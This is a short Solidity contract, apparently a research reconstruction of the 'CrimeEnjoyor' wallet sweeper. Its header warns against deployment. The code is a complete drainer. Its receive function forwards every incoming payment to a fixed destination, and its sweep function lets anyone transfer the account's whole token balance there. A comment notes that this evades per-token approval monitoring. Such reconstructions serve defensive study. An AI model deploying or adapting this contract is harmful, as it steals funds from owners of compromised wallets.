// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

/// @notice A sweeper modeled on the behaviour Wintermute documented for "CrimeEnjoyor" (May 2025):
/// installed on an already-compromised key, it forwards every incoming wei to a fixed address and
/// lets anyone push the account's tokens there. Not a copy of the deployed bytecode. DO NOT DEPLOY.
contract SweeperLike {
    // Immutable, so it lives in the delegate's code and works under delegation without storage.
    address public immutable destination;

    constructor(address destination_) {
        destination = destination_;
    }

    // Drains on arrival: account-level, so per-token approval monitoring sees nothing.
    receive() external payable {
        (bool ok,) = destination.call{value: msg.value}("");
        require(ok);
    }

    function sweep(address token) external {
        IERC20Like(token).transfer(destination, IERC20Like(token).balanceOf(address(this)));
    }
}
